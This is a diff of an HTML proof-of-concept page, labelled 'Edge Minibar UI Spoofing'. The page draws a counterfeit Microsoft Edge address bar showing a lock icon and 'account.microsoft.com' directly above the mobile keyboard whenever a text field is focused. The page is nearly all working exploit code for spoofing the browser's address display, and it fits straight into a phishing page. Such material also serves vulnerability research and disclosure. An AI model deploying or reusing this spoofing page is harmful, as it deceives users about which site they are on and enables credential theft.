@@ -1,119 +1,186 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Fake Mini URL Bar Demo</title>
-<style>
-  
-  button { padding: 12px 18px; font-size: 16px; margin-right: 10px; }
-  textarea { width: 100%; font-size: 18px; padding: 10px; margin-top: 20px; box-sizing: border-box; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>PoC - Edge Minibar UI Spoofing</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 20px;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #121212; /* Dark background to match screenshot */
+      color: white;
+    }
 
-  .fake-bar {
-    text-align: center;
-    background: #fff7f0;
-    border-top: 1px solid #e0cbb0;
-    border-bottom: 1px solid #e0cbb0;
-    color: #222;
-    font-size: 16px;
-    padding: 5px 0;
-    position: fixed;
-    width: 100%;
-    z-index: 9999;
-    opacity: 0;
-    visibility: hidden;
-    transition: opacity 0.3s ease, bottom 0.2s ease;
-  }
+    button { 
+      padding: 12px 18px; 
+      font-size: 16px; 
+      background: #0078d4; 
+      color: white; 
+      border: none; 
+      border-radius: 4px;
+      margin-bottom: 10px;
+    }
 
-  .fake-bar.show { opacity: 1; visibility: visible; }
+    textarea { 
+      width: 100%; 
+      font-size: 18px; 
+      padding: 10px; 
+      margin-top: 20px; 
+      box-sizing: border-box; 
+      background: #1e1e1e;
+      color: white;
+      border: 1px solid #333;
+    }
 
-  .spacer { height: 800px; }        /* Space to push middle textarea down */
-  .spacer-bottom { height: 1200px; } /* Space to push bottom text far down */
+    /* FAKE BAR CONTAINER */
+    .fake-bar {
+      position: fixed;
+      width: 100%;
+      left: 0;
+      z-index: 9999;
+      display: flex;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.2s ease, bottom 0.1s ease;
+      pointer-events: none;
+      padding-bottom: 8px; /* Offset from keyboard top */
+    }
 
-  .bottom-text { font-size: 20px; text-align: center; margin: 20px; }
-</style>
+    .fake-bar.show { 
+      opacity: 1; 
+      visibility: visible; 
+    }
+
+    /* EDGE PILL UI - Berdasarkan Gambar Microsoft Edge */
+    .edge-container {
+      background-color: #2b2b2b; /* Warna abu gelap bar */
+      width: 94%;
+      height: 58px;
+      border-radius: 50px;
+      display: flex;
+      align-items: center;
+      padding: 0 18px;
+      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
+      box-sizing: border-box;
+      position: relative;
+    }
+
+    /* Logo Copilot/Edge di Kiri */
+    .edge-logo {
+      width: 26px;
+      height: 26px;
+      flex-shrink: 0;
+    }
+
+    /* URL & Lock Icon di Tengah */
+    .url-content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-grow: 1;
+      gap: 6px;
+    }
+
+    .lock-icon {
+      width: 14px;
+      height: 14px;
+      opacity: 0.7;
+    }
+
+    .url-text {
+      color: #ffffff;
+      font-size: 16px;
+      letter-spacing: 0.2px;
+    }
+
+    /* Refresh Icon di Kanan */
+    .refresh-icon {
+      width: 22px;
+      height: 22px;
+      opacity: 0.9;
+      flex-shrink: 0;
+    }
+
+    /* Spacers for scrolling */
+    .spacer { height: 800px; }
+    .spacer-bottom { height: 1200px; }
+    .bottom-text { font-size: 18px; text-align: center; color: #888; }
+  </style>
 </head>
 <body>
 
-<button id="showBtn">Show Keyboard</button>
-<textarea id="ta" placeholder="Textarea at top…"></textarea>
+  <h2>Vulnerability PoC</h2>
+  <p>Scroll down to hide the omnibox, then click the input.</p>
 
-<div class="fake-bar" id="fakeBar">google.com</div>
+  <button id="showBtn">Trigger Exploit</button>
+  <textarea id="ta" placeholder="Top input..."></textarea>
 
-<!-- Spacer to push the middle textarea down -->
-<div class="spacer"></div>
+  <div class="fake-bar" id="fakeBar">
+    <div class="edge-container">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/f/f0/Microsoft_Edge_logo_%282019%29.svg" class="edge-logo">
+      
+      <div class="url-content">
+        <svg class="lock-icon" viewBox="0 0 24 24" fill="white">
+          <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM9 8V6c0-1.66 1.34-3 3-3s3 1.34 3 3v2H9z"/>
+        </svg>
+        <span class="url-text">account.microsoft.com</span>
+      </div>
 
-<!-- Middle textarea -->
-<textarea id="middleTa" placeholder="Textarea in the middle of page…"></textarea>
+      <svg class="refresh-icon" viewBox="0 0 24 24" fill="white">
+        <path d="M17.65 6.35C16.2 4.9 14.21 4 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08c-.82 2.33-3.04 4-5.65 4-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/>
+      </svg>
+    </div>
+  </div>
 
-<!-- Spacer to push the bottom text far down -->
-<div class="spacer-bottom"></div>
+  <div class="spacer"></div>
+  <textarea id="middleTa" placeholder="Middle input..."></textarea>
+  <div class="spacer-bottom"></div>
+  <div class="bottom-text">End of Page</div>
 
-<!-- Text far down the page -->
-<div class="bottom-text">
-  🎉 You finally scrolled down and found this text! 🎉
-</div>
+  <script>
+    const fakeBar = document.getElementById('fakeBar');
+    const ta = document.getElementById('ta');
+    const middleTa = document.getElementById('middleTa');
 
-<script>
-const fakeBar = document.getElementById('fakeBar');
-const ta = document.getElementById('ta');
-const middleTa = document.getElementById('middleTa');
-
-function adjustFakeBar() {
-  const vv = window.visualViewport;
-  let keyboardHeight = 0;
-  if (vv) {
-    keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
-  }
-  fakeBar.style.bottom = keyboardHeight + 'px';
-}
-
-function showFakeBar() {
-  fakeBar.classList.add('show');
-  adjustFakeBar();
-}
-
-function hideFakeBar() {
-  fakeBar.classList.remove('show');
-}
-
-// Update fake bar position when viewport changes (keyboard show/hide)
-if ('visualViewport' in window) {
-  window.visualViewport.addEventListener('resize', () => {
-    if (document.activeElement === ta || document.activeElement === middleTa) adjustFakeBar();
-  });
-}
-
-// Handle orientation changes
-window.addEventListener('orientationchange', adjustFakeBar);
-
-// Button click: show top textarea + fake bar
-document.getElementById("showBtn").onclick = async () => {
-  ta.focus();
-  try {
-    await document.documentElement.requestFullscreen();
-    setTimeout(() => {
-      prompt();
-      document.exitFullscreen().catch(() => {});
-    }, 2020);
-  } catch (e) {}
-
-  setTimeout(async () => {
-    if (navigator.virtualKeyboard?.show) {
-      try { await navigator.virtualKeyboard.show(); } catch(e){}
+    function adjustFakeBar() {
+      const vv = window.visualViewport;
+      if (vv) {
+        // Menghitung posisi tepat di atas keyboard virtual
+        const keyboardHeight = window.innerHeight - vv.height - vv.offsetTop;
+        fakeBar.style.bottom = (keyboardHeight > 0 ? keyboardHeight : 0) + 'px';
+      }
     }
-    showFakeBar();
-  }, 150);
-};
 
-// Show fake bar when either textarea is focused
-ta.addEventListener('focus', showFakeBar);
-middleTa.addEventListener('focus', showFakeBar);
+    function showFakeBar() {
+      fakeBar.classList.add('show');
+      adjustFakeBar();
+    }
 
-// Hide fake bar when either textarea loses focus
-ta.addEventListener('blur', hideFakeBar);
-middleTa.addEventListener('blur', hideFakeBar);
-</script>
+    function hideFakeBar() {
+      fakeBar.classList.remove('show');
+    }
 
+    if ('visualViewport' in window) {
+      window.visualViewport.addEventListener('resize', () => {
+        if (document.activeElement === ta || document.activeElement === middleTa) {
+          adjustFakeBar();
+        }
+      });
+      window.visualViewport.addEventListener('scroll', adjustFakeBar);
+    }
+
+    document.getElementById("showBtn").onclick = () => {
+      ta.focus();
+      showFakeBar();
+    };
+
+    ta.addEventListener('focus', showFakeBar);
+    middleTa.addEventListener('focus', showFakeBar);
+    ta.addEventListener('blur', hideFakeBar);
+    middleTa.addEventListener('blur', hideFakeBar);
+  </script>
 </body>
 </html>
